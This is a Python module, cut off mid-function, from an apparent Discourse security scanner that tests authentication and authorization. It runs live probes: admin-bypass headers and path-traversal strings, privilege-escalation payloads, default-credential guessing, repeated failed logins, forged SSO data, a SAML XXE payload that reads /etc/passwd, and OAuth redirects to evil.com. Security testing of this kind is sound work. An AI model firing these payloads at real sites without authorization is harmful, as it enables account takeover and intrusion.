#!/usr/bin/env python3
"""
Discourse Security Scanner - Authentication & Authorization Module

Tests authentication and authorization mechanisms
"""

import re
import time
import json
import base64
import hashlib
from urllib.parse import urljoin, quote, parse_qs, urlparse
from bs4 import BeautifulSoup
from .utils import extract_csrf_token, make_request

class AuthModule:
    """Authentication and authorization testing module for Discourse forums"""
    
    def __init__(self, scanner):
        self.scanner = scanner
        self.results = {
            'module_name': 'Authentication & Authorization Testing',
            'target': scanner.target_url,
            'auth_bypass': [],
            'privilege_escalation': [],
            'session_management': [],
            'password_policy': [],
            'account_lockout': [],
            'oauth_vulnerabilities': [],
            'sso_issues': [],
            'api_auth': [],
            'admin_access': [],
            'user_enumeration': []
        }
        
    def run_scan(self):
        """Run complete authentication and authorization scan"""
        print(f"\n{self.scanner.colors['info']}[*] Starting authentication and authorization scan...{self.scanner.colors['reset']}")
        
        # Authentication bypass tests
        self._test_auth_bypass()
        
        # Privilege escalation tests
        self._test_privilege_escalation()
        
        # Session management tests
        self._test_session_management()
        
        # Password policy tests
        self._test_password_policy()
        
        # Account lockout tests
        self._test_account_lockout()
        
        # OAuth vulnerabilities
        self._test_oauth_vulnerabilities()
        
        # SSO issues
        self._test_sso_issues()
        
        # API authentication
        self._test_api_authentication()
        
        # Admin access tests
        self._test_admin_access()
        
        # User enumeration
        self._test_user_enumeration()
        
        return self.results
    
    def _test_auth_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        print(f"{self.scanner.colors['info']}[*] Testing authentication bypass...{self.scanner.colors['reset']}")
        
        # Test direct access to protected endpoints
        protected_endpoints = [
            '/admin',
            '/admin/dashboard',
            '/admin/users',
            '/admin/site_settings',
            '/admin/api/keys',
            '/admin/customize',
            '/admin/logs',
            '/admin/reports',
            '/admin/plugins',
            '/admin/backups'
        ]
        
        for endpoint in protected_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            response = make_request(self.scanner.session, 'GET', url)
            
            if response:
                if response.status_code == 200 and 'login' not in response.text.lower():
                    self.results['auth_bypass'].append({
                        'endpoint': endpoint,
                        'method': 'Direct access',
                        'status_code': response.status_code,
                        'severity': 'Critical',
                        'description': f'Protected endpoint {endpoint} accessible without authentication'
                    })
                elif response.status_code in [301, 302]:
                    # Check redirect location
                    location = response.headers.get('Location', '')
                    if 'login' not in location.lower() and 'auth' not in location.lower():
                        self.results['auth_bypass'].append({
                            'endpoint': endpoint,
                            'method': 'Redirect bypass',
                            'redirect_to': location,
                            'severity': 'High',
                            'description': f'Protected endpoint {endpoint} redirects without proper auth check'
                        })
        
        # Test HTTP method bypass
        self._test_http_method_bypass()
        
        # Test header-based bypass
        self._test_header_bypass()
        
        # Test parameter pollution
        self._test_parameter_pollution()
        
        # Test path traversal bypass
        self._test_path_traversal_bypass()
    
    def _test_http_method_bypass(self):
        """Test HTTP method-based authentication bypass"""
        test_endpoint = '/admin/dashboard'
        url = urljoin(self.scanner.target_url, test_endpoint)
        
        methods = ['POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']
        
        for method in methods:
            response = make_request(self.scanner.session, method, url)
            
            if response and response.status_code == 200:
                self.results['auth_bypass'].append({
                    'endpoint': test_endpoint,
                    'method': f'HTTP {method} bypass',
                    'severity': 'High',
                    'description': f'Protected endpoint accessible via {method} method'
                })
    
    def _test_header_bypass(self):
        """Test header-based authentication bypass"""
        test_endpoint = '/admin/dashboard'
        url = urljoin(self.scanner.target_url, test_endpoint)
        
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Forwarded-Server': 'localhost'},
            {'X-Original-URL': '/admin/dashboard'},
            {'X-Rewrite-URL': '/admin/dashboard'},
            {'X-Override-URL': '/admin/dashboard'},
            {'X-Admin': 'true'},
            {'X-User-Role': 'admin'},
            {'X-Auth-User': 'admin'},
            {'X-Authenticated': 'true'},
            {'Authorization': 'Bearer admin'},
            {'Cookie': 'admin=true'},
            {'Referer': urljoin(self.scanner.target_url, '/admin')}
        ]
        
        for headers in bypass_headers:
            response = make_request(self.scanner.session, 'GET', url, headers=headers)
            
            if response and response.status_code == 200 and 'login' not in response.text.lower():
                self.results['auth_bypass'].append({
                    'endpoint': test_endpoint,
                    'method': 'Header bypass',
                    'headers': headers,
                    'severity': 'High',
                    'description': f'Authentication bypassed using headers: {headers}'
                })
    
    def _test_parameter_pollution(self):
        """Test parameter pollution for authentication bypass"""
        login_url = urljoin(self.scanner.target_url, '/session')
        csrf_token = extract_csrf_token(self.scanner.session, self.scanner.target_url)
        
        if csrf_token:
            # Test parameter pollution techniques
            pollution_tests = [
                {
                    'name': 'Duplicate parameters',
                    'data': 'login=user&login=admin&password=test&authenticity_token=' + csrf_token
                },
                {
                    'name': 'Array parameters',
                    'data': 'login[]=user&login[]=admin&password=test&authenticity_token=' + csrf_token
                },
                {
                    'name': 'Nested parameters',
                    'data': 'user[login]=admin&user[role]=admin&password=test&authenticity_token=' + csrf_token
                }
            ]
            
            for test in pollution_tests:
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                response = make_request(self.scanner.session, 'POST', login_url, 
                                      data=test['data'], headers=headers)
                
                if response and response.status_code == 200:
                    # Check if we got admin access
                    admin_check = make_request(self.scanner.session, 'GET', 
                                             urljoin(self.scanner.target_url, '/admin'))
                    
                    if admin_check and admin_check.status_code == 200:
                        self.results['auth_bypass'].append({
                            'method': test['name'],
                            'endpoint': '/session',
                            'severity': 'Critical',
                            'description': f'Authentication bypassed using {test["name"]}'
                        })
    
    def _test_path_traversal_bypass(self):
        """Test path traversal for authentication bypass"""
        base_endpoint = '/admin/dashboard'
        
        traversal_payloads = [
            '../admin/dashboard',
            '..%2fadmin%2fdashboard',
            '..%252fadmin%252fdashboard',
            '....//admin//dashboard',
            '%2e%2e%2fadmin%2fdashboard',
            '..\\admin\\dashboard',
            '..%5cadmin%5cdashboard',
            '/%2e%2e/admin/dashboard'
        ]
        
        for payload in traversal_payloads:
            url = urljoin(self.scanner.target_url, payload)
            response = make_request(self.scanner.session, 'GET', url)
            
            if response and response.status_code == 200 and 'login' not in response.text.lower():
                self.results['auth_bypass'].append({
                    'method': 'Path traversal bypass',
                    'payload': payload,
                    'severity': 'High',
                    'description': f'Authentication bypassed using path traversal: {payload}'
                })
    
    def _test_privilege_escalation(self):
        """Test for privilege escalation vulnerabilities"""
        print(f"{self.scanner.colors['info']}[*] Yetki yükseltme test ediliyor...{self.scanner.colors['reset']}")
        
        # Test role manipulation
        self._test_role_manipulation()
        
        # Test group membership manipulation
        self._test_group_manipulation()
        
        # Test admin flag manipulation
        self._test_admin_flag_manipulation()
        
        # Test API key privilege escalation
        self._test_api_key_escalation()
    
    def _test_role_manipulation(self):
        """Test role manipulation for privilege escalation"""
        # Test user profile update with role manipulation
        profile_endpoints = [
            '/u/update',
            '/users/update',
            '/api/users/update',
            '/my/preferences'
        ]
        
        csrf_token = extract_csrf_token(self.scanner.session, self.scanner.target_url)
        
        for endpoint in profile_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            # Test various role escalation payloads
            escalation_payloads = [
                {'role': 'admin'},
                {'user_role': 'admin'},
                {'is_admin': 'true'},
                {'admin': '1'},
                {'privilege': 'admin'},
                {'level': 'admin'},
                {'group': 'administrators'},
                {'groups[]': 'admin'},
                {'user[admin]': 'true'},
                {'user[role]': 'admin'},
                {'user[is_admin]': '1'}
            ]
            
            for payload in escalation_payloads:
                if csrf_token:
                    payload['authenticity_token'] = csrf_token
                
                response = make_request(self.scanner.session, 'POST', url, data=payload)
                
                if response and response.status_code in [200, 302]:
                    # Check if we gained admin access
                    admin_check = make_request(self.scanner.session, 'GET', 
                                             urljoin(self.scanner.target_url, '/admin'))
                    
                    if admin_check and admin_check.status_code == 200:
                        self.results['privilege_escalation'].append({
                            'endpoint': endpoint,
                            'method': 'Role manipulation',
                            'payload': payload,
                            'severity': 'Critical',
                            'description': f'Privilege escalation via role manipulation at {endpoint}'
                        })
                        break
    
    def _test_group_manipulation(self):
        """Test group membership manipulation"""
        # Test group join/leave endpoints
        group_endpoints = [
            '/groups/join',
            '/groups/add_members',
            '/api/groups/add_members',
            '/admin/groups/bulk'
        ]
        
        csrf_token = extract_csrf_token(self.scanner.session, self.scanner.target_url)
        
        for endpoint in group_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            # Try to join admin groups
            admin_groups = ['admins', 'administrators', 'staff', 'moderators', 'trust_level_4']
            
            for group in admin_groups:
                payload = {
                    'group_name': group,
                    'group': group,
                    'group_id': group,
                    'usernames': 'current_user'
                }
                
                if csrf_token:
                    payload['authenticity_token'] = csrf_token
                
                response = make_request(self.scanner.session, 'POST', url, data=payload)
                
                if response and response.status_code in [200, 302]:
                    # Check if we gained elevated privileges
                    admin_check = make_request(self.scanner.session, 'GET', 
                                             urljoin(self.scanner.target_url, '/admin'))
                    
                    if admin_check and admin_check.status_code == 200:
                        self.results['privilege_escalation'].append({
                            'endpoint': endpoint,
                            'method': 'Group manipulation',
                            'group': group,
                            'severity': 'Critical',
                            'description': f'Privilege escalation via group membership: {group}'
                        })
                        break
    
    def _test_admin_flag_manipulation(self):
        """Test admin flag manipulation in requests"""
        # Test various endpoints with admin flags
        test_endpoints = [
            '/session',
            '/users/create',
            '/api/users',
            '/my/preferences'
        ]
        
        csrf_token = extract_csrf_token(self.scanner.session, self.scanner.target_url)
        
        for endpoint in test_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            # Test admin flag injection
            admin_flags = [
                {'admin': 'true'},
                {'is_admin': '1'},
                {'user_admin': 'true'},
                {'moderator': 'true'},
                {'staff': 'true'},
                {'trust_level': '4'},
                {'approved': 'true'},
                {'active': 'true'}
            ]
            
            for flag in admin_flags:
                if csrf_token:
                    flag['authenticity_token'] = csrf_token
                
                # Test both POST and PUT methods
                for method in ['POST', 'PUT']:
                    response = make_request(self.scanner.session, method, url, data=flag)
                    
                    if response and response.status_code in [200, 201, 302]:
                        # Check response for admin indicators
                        if any(indicator in response.text.lower() for indicator in 
                               ['admin', 'staff', 'moderator', 'trust_level_4']):
                            self.results['privilege_escalation'].append({
                                'endpoint': endpoint,
                                'method': f'Admin flag manipulation ({method})',
                                'flag': flag,
                                'severity': 'High',
                                'description': f'Admin flag accepted at {endpoint}'
                            })
    
    def _test_api_key_escalation(self):
        """Test API key privilege escalation"""
        # Test API key creation with elevated privileges
        api_endpoints = [
            '/admin/api/keys',
            '/api/keys',
            '/user_api_keys'
        ]
        
        csrf_token = extract_csrf_token(self.scanner.session, self.scanner.target_url)
        
        for endpoint in api_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            # Try to create API key with admin scopes
            escalation_payloads = [
                {
                    'description': 'Test Key',
                    'scopes': 'read,write,admin',
                    'admin': 'true'
                },
                {
                    'key': {
                        'description': 'Test Key',
                        'scopes': ['global'],
                        'admin_only': True
                    }
                },
                {
                    'api_key': {
                        'description': 'Test Key',
                        'user_id': 1,  # Admin user ID
                        'scopes': 'all'
                    }
                }
            ]
            
            for payload in escalation_payloads:
                if csrf_token:
                    payload['authenticity_token'] = csrf_token
                
                response = make_request(self.scanner.session, 'POST', url, json=payload)
                
                if response and response.status_code in [200, 201]:
                    try:
                        result = response.json()
                        if 'key' in result or 'api_key' in result:
                            self.results['privilege_escalation'].append({
                                'endpoint': endpoint,
                                'method': 'API key escalation',
                                'severity': 'Critical',
                                'description': f'Created elevated API key at {endpoint}'
                            })
                    except json.JSONDecodeError:
                        pass
    
    def _test_session_management(self):
        """Test session management security"""
        print(f"{self.scanner.colors['info']}[*] Session yönetimi test ediliyor...{self.scanner.colors['reset']}")
        
        # Test session fixation
        self._test_session_fixation()
        
        # Test session hijacking
        self._test_session_hijacking()
        
        # Test concurrent sessions
        self._test_concurrent_sessions()
        
        # Test session timeout
        self._test_session_timeout()
    
    def _test_session_fixation(self):
        """Test for session fixation vulnerabilities"""
        # Get initial session
        response1 = make_request(self.scanner.session, 'GET', self.scanner.target_url)
        initial_session_id = None
        
        if response1:
            for cookie in response1.cookies:
                if 'session' in cookie.name.lower():
                    initial_session_id = cookie.value
                    break
        
        if initial_session_id:
            # Attempt login
            login_url = urljoin(self.scanner.target_url, '/session')
            csrf_token = extract_csrf_token(self.scanner.session, self.scanner.target_url)
            
            if csrf_token:
                login_data = {
                    'login': 'test@example.com',
                    'password': 'testpassword',
                    'authenticity_token': csrf_token
                }
                
                response2 = make_request(self.scanner.session, 'POST', login_url, data=login_data)
                
                if response2:
                    # Check if session ID changed
                    new_session_id = None
                    for cookie in response2.cookies:
                        if 'session' in cookie.name.lower():
                            new_session_id = cookie.value
                            break
                    
                    if new_session_id == initial_session_id:
                        self.results['session_management'].append({
                            'vulnerability': 'Session fixation',
                            'severity': 'High',
                            'description': 'Session ID does not change after login'
                        })
    
    def _test_session_hijacking(self):
        """Test session hijacking resistance"""
        # Test if session works with different User-Agent
        original_ua = self.scanner.session.headers.get('User-Agent', '')
        
        # Change User-Agent
        self.scanner.session.headers['User-Agent'] = 'AttackerBrowser/1.0'
        
        response = make_request(self.scanner.session, 'GET', self.scanner.target_url)
        
        # Restore original User-Agent
        self.scanner.session.headers['User-Agent'] = original_ua
        
        if response and response.status_code == 200:
            # Check if session is still valid
            if 'logout' in response.text.lower() or 'dashboard' in response.text.lower():
                self.results['session_management'].append({
                    'vulnerability': 'Weak session binding',
                    'severity': 'Medium',
                    'description': 'Session not properly bound to client characteristics'
                })
    
    def _test_concurrent_sessions(self):
        """Test concurrent session handling"""
        # Create multiple sessions for the same user
        login_url = urljoin(self.scanner.target_url, '/session')
        csrf_token = extract_csrf_token(self.scanner.session, self.scanner.target_url)
        
        if csrf_token:
            # Create second session
            import requests
            session2 = requests.Session()
            
            login_data = {
                'login': 'test@example.com',
                'password': 'testpassword',
                'authenticity_token': csrf_token
            }
            
            # Login with both sessions
            response1 = make_request(self.scanner.session, 'POST', login_url, data=login_data)
            response2 = make_request(session2, 'POST', login_url, data=login_data)
            
            if response1 and response2:
                # Check if both sessions are active
                check1 = make_request(self.scanner.session, 'GET', 
                                    urljoin(self.scanner.target_url, '/my/preferences'))
                check2 = make_request(session2, 'GET', 
                                    urljoin(self.scanner.target_url, '/my/preferences'))
                
                if (check1 and check1.status_code == 200 and 
                    check2 and check2.status_code == 200):
                    self.results['session_management'].append({
                        'vulnerability': 'Concurrent sessions allowed',
                        'severity': 'Low',
                        'description': 'Multiple active sessions allowed for same user'
                    })
    
    def _test_session_timeout(self):
        """Test session timeout implementation"""
        # This is a simplified test - in reality, you'd wait for actual timeout
        response = make_request(self.scanner.session, 'GET', self.scanner.target_url)
        
        if response:
            # Check for session timeout configuration in response
            if 'timeout' not in response.text.lower() and 'expire' not in response.text.lower():
                # Check cookies for expiration
                has_expiration = False
                for cookie in response.cookies:
                    if cookie.expires:
                        has_expiration = True
                        break
                
                if not has_expiration:
                    self.results['session_management'].append({
                        'vulnerability': 'No session timeout',
                        'severity': 'Medium',
                        'description': 'Session cookies lack expiration time'
                    })
    
    def _test_password_policy(self):
        """Test password policy enforcement"""
        print(f"{self.scanner.colors['info']}[*] Şifre politikası test ediliyor...{self.scanner.colors['reset']}")
        
        # Test user registration with weak passwords
        register_url = urljoin(self.scanner.target_url, '/u/create')
        csrf_token = extract_csrf_token(self.scanner.session, self.scanner.target_url)
        
        if csrf_token:
            weak_passwords = [
                '123',
                'password',
                '123456',
                'admin',
                'test',
                'a',
                '11111111',
                'qwerty'
            ]
            
            for weak_password in weak_passwords:
                register_data = {
                    'name': 'Test User',
                    'username': f'testuser_{int(time.time())}',
                    'email': f'test_{int(time.time())}@example.com',
                    'password': weak_password,
                    'authenticity_token': csrf_token
                }
                
                response = make_request(self.scanner.session, 'POST', register_url, data=register_data)
                
                if response and response.status_code in [200, 201, 302]:
                    if 'error' not in response.text.lower() and 'invalid' not in response.text.lower():
                        self.results['password_policy'].append({
                            'weak_password': weak_password,
                            'severity': 'Medium',
                            'description': f'Weak password "{weak_password}" accepted during registration'
                        })
                        break  # Stop after first successful weak password
        
        # Test password change with weak passwords
        self._test_password_change_policy()
    
    def _test_password_change_policy(self):
        """Test password change policy"""
        change_url = urljoin(self.scanner.target_url, '/my/preferences/password')
        csrf_token = extract_csrf_token(self.scanner.session, self.scanner.target_url)
        
        if csrf_token:
            weak_passwords = ['123', 'password', 'test']
            
            for weak_password in weak_passwords:
                change_data = {
                    'old_password': 'currentpassword',
                    'new_password': weak_password,
                    'new_password_confirmation': weak_password,
                    'authenticity_token': csrf_token
                }
                
                response = make_request(self.scanner.session, 'PUT', change_url, data=change_data)
                
                if response and response.status_code in [200, 302]:
                    if 'error' not in response.text.lower():
                        self.results['password_policy'].append({
                            'weak_password': weak_password,
                            'context': 'Password change',
                            'severity': 'Medium',
                            'description': f'Weak password "{weak_password}" accepted during password change'
                        })
    
    def _test_account_lockout(self):
        """Test account lockout policy"""
        print(f"{self.scanner.colors['info']}[*] Hesap kilitleme politikası test ediliyor...{self.scanner.colors['reset']}")
        
        login_url = urljoin(self.scanner.target_url, '/session')
        csrf_token = extract_csrf_token(self.scanner.session, self.scanner.target_url)
        
        if csrf_token:
            # Test multiple failed login attempts
            failed_attempts = 0
            max_attempts = 10
            
            for attempt in range(max_attempts):
                login_data = {
                    'login': 'admin',  # Common username
                    'password': f'wrongpassword{attempt}',
                    'authenticity_token': csrf_token
                }
                
                response = make_request(self.scanner.session, 'POST', login_url, data=login_data)
                
                if response:
                    if response.status_code == 429:  # Rate limited
                        self.results['account_lockout'].append({
                            'attempts_before_lockout': attempt + 1,
                            'severity': 'Low',
                            'description': f'Account lockout triggered after {attempt + 1} attempts'
                        })
                        break
                    elif 'locked' in response.text.lower() or 'blocked' in response.text.lower():
                        self.results['account_lockout'].append({
                            'attempts_before_lockout': attempt + 1,
                            'severity': 'Low',
                            'description': f'Account lockout triggered after {attempt + 1} attempts'
                        })
                        break
                    else:
                        failed_attempts += 1
                
                time.sleep(1)  # Avoid overwhelming the server
            
            if failed_attempts >= max_attempts:
                self.results['account_lockout'].append({
                    'vulnerability': 'No account lockout',
                    'attempts_tested': max_attempts,
                    'severity': 'Medium',
                    'description': f'No account lockout after {max_attempts} failed attempts'
                })
    
    def _test_oauth_vulnerabilities(self):
        """Test OAuth implementation vulnerabilities"""
        print(f"{self.scanner.colors['info']}[*] Testing OAuth vulnerabilities...{self.scanner.colors['reset']}")
        
        # Look for OAuth endpoints
        oauth_endpoints = [
            '/auth/oauth',
            '/auth/oauth2',
            '/oauth/authorize',
            '/oauth2/authorize',
            '/auth/google_oauth2',
            '/auth/facebook',
            '/auth/github',
            '/auth/twitter',
            '/auth/discord'
        ]
        
        for endpoint in oauth_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            response = make_request(self.scanner.session, 'GET', url)
            
            if response and response.status_code in [200, 302]:
                # Test OAuth vulnerabilities
                self._test_oauth_redirect_uri(endpoint)
                self._test_oauth_state_parameter(endpoint)
                self._test_oauth_code_reuse(endpoint)
    
    def _test_oauth_redirect_uri(self, oauth_endpoint):
        """Test OAuth redirect URI validation"""
        malicious_redirects = [
            'http://evil.com',
            'https://attacker.com',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            '//evil.com',
            'http://localhost:8080/evil'
        ]
        
        for redirect in malicious_redirects:
            params = {
                'redirect_uri': redirect,
                'response_type': 'code',
                'client_id': 'test'
            }
            
            url = urljoin(self.scanner.target_url, oauth_endpoint)
            response = make_request(self.scanner.session, 'GET', url, params=params)
            
            if response and response.status_code in [200, 302]:
                if response.status_code == 302:
                    location = response.headers.get('Location', '')
                    if redirect in location:
                        self.results['oauth_vulnerabilities'].append({
                            'endpoint': oauth_endpoint,
                            'vulnerability': 'Open redirect in OAuth',
                            'malicious_redirect': redirect,
                            'severity': 'High',
                            'description': f'OAuth accepts malicious redirect URI: {redirect}'
                        })
    
    def _test_oauth_state_parameter(self, oauth_endpoint):
        """Test OAuth state parameter validation"""
        # Test without state parameter
        params = {
            'response_type': 'code',
            'client_id': 'test',
            'redirect_uri': urljoin(self.scanner.target_url, '/auth/callback')
        }
        
        url = urljoin(self.scanner.target_url, oauth_endpoint)
        response = make_request(self.scanner.session, 'GET', url, params=params)
        
        if response and response.status_code in [200, 302]:
            if 'state' not in response.text.lower():
                self.results['oauth_vulnerabilities'].append({
                    'endpoint': oauth_endpoint,
                    'vulnerability': 'Missing OAuth state parameter',
                    'severity': 'Medium',
                    'description': 'OAuth flow does not require state parameter (CSRF vulnerable)'
                })
    
    def _test_oauth_code_reuse(self, oauth_endpoint):
        """Test OAuth authorization code reuse"""
        # This is a simplified test - would need actual OAuth flow
        callback_url = urljoin(self.scanner.target_url, '/auth/callback')
        
        # Test with fake authorization code
        params = {
            'code': 'test_auth_code_123',
            'state': 'test_state'
        }
        
        response = make_request(self.scanner.session, 'GET', callback_url, params=params)
        
        if response and response.status_code == 200:
            # Try to reuse the same code
            response2 = make_request(self.scanner.session, 'GET', callback_url, params=params)
            
            if response2 and response2.status_code == 200:
                self.results['oauth_vulnerabilities'].append({
                    'endpoint': '/auth/callback',
                    'vulnerability': 'OAuth code reuse',
                    'severity': 'High',
                    'description': 'OAuth authorization code can be reused'
                })
    
    def _test_sso_issues(self):
        """Test Single Sign-On implementation issues"""
        print(f"{self.scanner.colors['info']}[*] Testing SSO vulnerabilities...{self.scanner.colors['reset']}")
        
        # Look for SSO endpoints
        sso_endpoints = [
            '/session/sso',
            '/session/sso_login',
            '/auth/sso',
            '/sso',
            '/saml/sso',
            '/saml/acs'
        ]
        
        for endpoint in sso_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            response = make_request(self.scanner.session, 'GET', url)
            
            if response and response.status_code in [200, 302]:
                # Test SSO vulnerabilities
                self._test_sso_signature_bypass(endpoint)
                self._test_sso_replay_attack(endpoint)
                self._test_sso_xml_injection(endpoint)
    
    def _test_sso_signature_bypass(self, sso_endpoint):
        """Test SSO signature bypass"""
        # Test with invalid signature
        sso_data = {
            'sso': base64.b64encode(b'user=admin&admin=true').decode(),
            'sig': 'invalid_signature'
        }
        
        url = urljoin(self.scanner.target_url, sso_endpoint)
        response = make_request(self.scanner.session, 'POST', url, data=sso_data)
        
        if response and response.status_code in [200, 302]:
            # Check if we got authenticated
            admin_check = make_request(self.scanner.session, 'GET', 
                                     urljoin(self.scanner.target_url, '/admin'))
            
            if admin_check and admin_check.status_code == 200:
                self.results['sso_issues'].append({
                    'endpoint': sso_endpoint,
                    'vulnerability': 'SSO signature bypass',
                    'severity': 'Critical',
                    'description': 'SSO accepts invalid signatures'
                })
    
    def _test_sso_replay_attack(self, sso_endpoint):
        """Test SSO replay attack"""
        # This would require capturing a valid SSO token first
        # Simplified test with timestamp manipulation
        import time
        old_timestamp = int(time.time()) - 3600  # 1 hour ago
        
        sso_payload = f'user=test&timestamp={old_timestamp}'
        sso_data = {
            'sso': base64.b64encode(sso_payload.encode()).decode(),
            'sig': 'test_signature'
        }
        
        url = urljoin(self.scanner.target_url, sso_endpoint)
        response = make_request(self.scanner.session, 'POST', url, data=sso_data)
        
        if response and response.status_code in [200, 302]:
            if 'error' not in response.text.lower() and 'expired' not in response.text.lower():
                self.results['sso_issues'].append({
                    'endpoint': sso_endpoint,
                    'vulnerability': 'SSO replay attack',
                    'severity': 'High',
                    'description': 'SSO does not validate timestamp/nonce'
                })
    
    def _test_sso_xml_injection(self, sso_endpoint):
        """Test SSO XML injection (for SAML)"""
        if 'saml' in sso_endpoint.lower():
            # Test XML injection in SAML response
            xml_payloads = [
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
                '<script>alert(1)</script>',
                '&lt;script&gt;alert(1)&lt;/script&gt;'
            ]
            
            for payload in xml_payloads:
                saml_data = {
                    'SAMLResponse': base64.b64encode(payload.encode()).decode()
                }
                
                url = urljoin(self.scanner.target_url, sso_endpoint)
                response = make_request(self.scanner.session, 'POST', url, data=saml_data)
                
                if response and response.status_code == 200:
                    if 'root:' in response.text or 'alert(1)' in response.text:
                        self.results['sso_issues'].append({
                            'endpoint': sso_endpoint,
                            'vulnerability': 'SAML XML injection',
                            'payload': payload[:50] + '...',
                            'severity': 'High',
                            'description': 'SAML endpoint vulnerable to XML injection'
                        })
                        break
    
    def _test_api_authentication(self):
        """Test API authentication mechanisms"""
        print(f"{self.scanner.colors['info']}[*] Testing API authentication...{self.scanner.colors['reset']}")
        
        # Test API endpoints without authentication
        api_endpoints = [
            '/api/users',
            '/api/posts',
            '/api/categories',
            '/api/topics',
            '/admin/api/keys',
            '/admin/api/users'
        ]
        
        for endpoint in api_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            # Test without authentication
            response = make_request(self.scanner.session, 'GET', url)
            
            if response and response.status_code == 200:
                try:
                    data = response.json()
                    if data:  # Got actual data
                        self.results['api_auth'].append({
                            'endpoint': endpoint,
                            'vulnerability': 'Unauthenticated API access',
                            'severity': 'High',
                            'description': f'API endpoint {endpoint} accessible without authentication'
                        })
                except json.JSONDecodeError:
                    pass
            
            # Test with weak API keys
            weak_keys = ['test', 'admin', '123456', 'api_key', 'secret']
            
            for key in weak_keys:
                headers = {
                    'Api-Key': key,
                    'Authorization': f'Bearer {key}',
                    'X-Api-Key': key
                }
                
                response = make_request(self.scanner.session, 'GET', url, headers=headers)
                
                if response and response.status_code == 200:
                    try:
                        data = response.json()
                        if data:
                            self.results['api_auth'].append({
                                'endpoint': endpoint,
                                'vulnerability': 'Weak API key accepted',
                                'api_key': key,
                                'severity': 'Critical',
                                'description': f'Weak API key "{key}" accepted at {endpoint}'
                            })
                            break
                    except json.JSONDecodeError:
                        pass
    
    def _test_admin_access(self):
        """Test admin access controls"""
        print(f"{self.scanner.colors['info']}[*] Admin erişim kontrolleri test ediliyor...{self.scanner.colors['reset']}")
        
        # Test default admin credentials
        self._test_default_credentials()
        
        # Test admin panel access
        self._test_admin_panel_access()
        
        # Test admin API access
        self._test_admin_api_access()
    
    def _test_default_credentials(self):
        """Test default admin credentials"""
        login_url = urljoin(self.scanner.target_url, '/session')
        csrf_token = extract_csrf_token(self.scanner.session, self.scanner.target_url)
        
        if csrf_token:
            default_creds = [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', '123456'),
                ('administrator', 'administrator'),
                ('root', 'root'),
                ('admin', ''),
                ('discourse', 'discourse')
            ]
            
            for username, password in default_creds:
                login_data = {
                    'login': username,
                    'password': password,
                    'authenticity_token': csrf_token
                }
                
                response = make_request(self.scanner.session, 'POST', login_url, data=login_data)
                
                if response and response.status_code in [200, 302]:
                    # Check if login was successful
                    admin_check = make_request(self.scanner.session, 'GET', 
                                             urljoin(self.scanner.target_url, '/admin'))
                    
                    if admin_check and admin_check.status_code == 200:
                        self.results['admin_access'].append({
                            'vulnerability': 'Default admin credentials',
                            'username': username,
                            'password': password,
                            'severity': 'Critical',
                            'description': f'Default credentials work: {username}:{password}'
                        })
                        break
    
    def _test_admin_panel_access(self):
        """Test admin panel access controls"""
        admin_endpoints = [
            '/admin',
            '/admin/dashboard',
            '/admin/users',
            '/admin/site_settings',
            '/admin/customize',
            '/admin/logs',
            '/admin/reports',
            '/admin/plugins',
            '/admin/backups'
        ]
        
        for endpoint in admin_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            response = make_request(self.scanner.session, 'GET', url)
            
            if response and response.status_code == 200:
                # Check if we can access admin functions
                if any(indicator in response.text.lower() for indicator in 
                       ['admin', 'dashboard', 'settings', 'users', 'logs']):
                    self.results['admin_access'].append({
                        'endpoint': endpoint,
                        'vulnerability': 'Unauthorized admin access',
                        'severity': 'Critical',
                        'description': f'Admin panel accessible at {endpoint}'
                    })
    
    def _test_admin_api_access(self):
        """Test admin API access controls"""
        admin_api_endpoints = [
            '/admin/api/keys.json',
            '/admin/api/users.json',
            '/admin/api/site_settings.json',
            '/admin/api/logs.json'
        ]
        
        for endpoint in admin_api_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            response = make_request(self.scanner.session, 'GET', url)
            
            if response and response.status_code == 200:
                try:
                    data = response.json()
                    if data:
                        self.results['admin_access'].append({
                            'endpoint': endpoint,
                            'vulnerability': 'Unauthorized admin API access',
                            'severity': 'Critical',
                            'description': f'Admin API accessible at {endpoint}'
                        })
                except json.JSONDecodeError:
                    pass
    
    def _test_user_enumeration(self):
        """Test user enumeration vulnerabilities"""
        print(f"{self.scanner.colors['info']}[*] Kullanıcı numaralandırma test ediliyor...{self.scanner.colors['reset']}")
        
        # Test user enumeration via login
        self._test_login_user_enumeration()
        
        # Test user enumeration via registration
        self._test_registration_user_enumeration()
        
        # Test user enumeration via password reset
        self._test_password_reset_enumeration()
        
        # Test user enumeration via API
        self._test_api_user_enumeration()
    
    def _test_login_user_enumeration(self):
        """Test user enumeration via login responses"""
        login_url = urljoin(self.scanner.target_url, '/session')
        csrf_token = extract_csrf_token(self.scanner.session, self.scanner.target_url)
        
        if csrf_token:
            # Test with likely existing username
            existing_user_data = {
                'login': 'admin',
                'password': 'wrongpassword',
                'authenticity_token': csrf_token
            }
            
            response1 = make_request(self.scanner.session, 'POST', login_url, data=existing_user_data)
            
            # Test with non-existing username
            nonexisting_user_data = {
                'login': 'nonexistentuser12345',
                'password': 'wrongpassword',
                'authenticity_token': csrf_token
            }
            
            response2 = make_request(self.scanner.session, 'POST', login_url, data=nonexisting_user_data)
            
            if response1 and response2:
                # Compare responses
                if (response1.text != response2.text or 
                    response1.status_code != response2.status_code):
